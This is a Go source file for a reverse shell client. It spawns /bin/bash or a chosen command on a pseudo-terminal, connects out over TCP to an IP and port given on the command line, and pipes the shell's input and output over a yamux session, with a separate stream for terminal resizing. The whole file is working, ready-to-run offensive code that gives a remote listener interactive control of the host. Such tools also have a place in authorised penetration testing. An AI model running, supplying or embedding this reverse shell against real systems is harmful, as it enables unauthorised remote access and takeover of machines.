package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"

	"github.com/creack/pty"
	"github.com/hashicorp/yamux"
	"github.com/jessevdk/go-flags"
)

type options struct {
	IpAddress string `short:"i" long:"ipAddress" description:"IP address to connect to" required:"true"`
	Port      int    `short:"p" long:"port" description:"Port to connect to" default:"1337"`
	Cmd       string `short:"c" long:"cmd" description:"Exec command and redirect IO to connection" default:"/bin/bash"`
}

func main() {
	// parse command line args
	opts := parseArgs()

	// start cmd exec on a pty shell
	ptmx := startPtyShell(opts.Cmd)
	defer ptmx.Close()

	// send rev shell to tcp:ipaddress:port
	dialTcpShell(opts.IpAddress, opts.Port, ptmx)
}

func startPtyShell(cmdString string) (*os.File) {
	// break down into cmd and args
	var cmd *exec.Cmd
	tokens := strings.Fields(cmdString)
	if len(tokens) == 1 {
		cmd = exec.Command(tokens[0])
	} else {
		cmd = exec.Command(tokens[0], tokens[1:]...)
	}

	// start cmd on pty
	ptmx, err := pty.Start(cmd)
	fatalIfErr("Start PTY", err)

	// return pty file
	return ptmx
}

func dialTcpShell(ipAddress string, port int, ptmx *os.File) {
	// connect back
	fmt.Printf("[*] Dialing %s:%d\n", ipAddress, port)
	addressPort := fmt.Sprintf("%s:%d", ipAddress, port)
	conn, err := net.Dial("tcp", addressPort)
	fatalIfErr("Dial", err)

	// handle connection
	fmt.Printf("[*] Connected to %s\n", conn.RemoteAddr().String())
	//handleSimpleConnection(conn, ptmx)
	handleMuxConnection(conn, ptmx)
}

func handleSimpleConnection(conn net.Conn, ptmx *os.File) {
	defer conn.Close() // FINishes the conn

	// redirect IO to socket
	done := make(chan struct{})
	go func() { io.Copy(conn, ptmx); done <- struct{}{} }()
	go func() { io.Copy(ptmx, conn); done <- struct{}{} }()
	<-done
}

func handleMuxConnection(conn net.Conn, ptmx *os.File) {
	// create a mux session over this connection
	session, err := yamux.Client(conn, nil)
	fatalIfErr("Session", err)
	defer session.Close() // closes all streams and conn

	// any message pushed to done will be used to return later
	done := make(chan struct{})
	defer func() { <-done }()

	// stream for shell IO
	ioStream, err := session.Open()
	fatalIfErr("Stream io", err)
	go streamShellIO(ioStream, ptmx, done)

	// stream for resizing window
	resizeStream, err := session.Open()
	fatalIfErr("Stream resize", err)
	go streamResize(resizeStream, ptmx)
}

func streamShellIO(stream net.Conn, ptmx *os.File, done chan struct{}) {
	go func() { io.Copy(ptmx, stream); done <- struct{}{} }() // read stdin from socket
	go func() { io.Copy(stream, ptmx); done <- struct{}{} }() // write stdout to socket
}

func streamResize(stream net.Conn, ptmx *os.File) {
	decoder := gob.NewDecoder(stream)
	for {
		// get new size
		var size struct{ Width, Height int }
		err := decoder.Decode(&size)
		if err != nil && err != io.EOF {
			// skip setting size
			logErr("Get size", err)
			continue
		}

		// set size
		ws := &pty.Winsize{Cols: uint16(size.Width), Rows: uint16(size.Height)}
		err = pty.Setsize(ptmx, ws)
		logIfErr("Set size", err)
	}
}

func parseArgs() *options {
	var opts options
	if _, err := flags.Parse(&opts); err != nil {
		/*
			passing help flag in args prints help and also throws ErrHelp
			if error type is ErrHelp, omit second print and exit cleanly
			everything else log and exit with error
		*/
		switch flagsErrPtr := err.(type) {
		case *flags.Error:
			flagsErrType := (*flagsErrPtr).Type
			if flagsErrType == flags.ErrHelp {
				os.Exit(0)
			}
			fatalIfErr(flagsErrType.String(), err)
		default:
			fatalIfErr("Args", err)
		}
	}
	return &opts
}

func fatalIfErr(context string, err error) {
	if err != nil {
		log.Fatalf("[!] %s:\n%s\n", context, err)
	}
}

func logIfErr(context string, err error) {
	if err != nil {
		logErr(context, err)
	}
}

func logErr(context string, err error) {
	log.Printf("[!] %s -> %s\n", context, err)
}
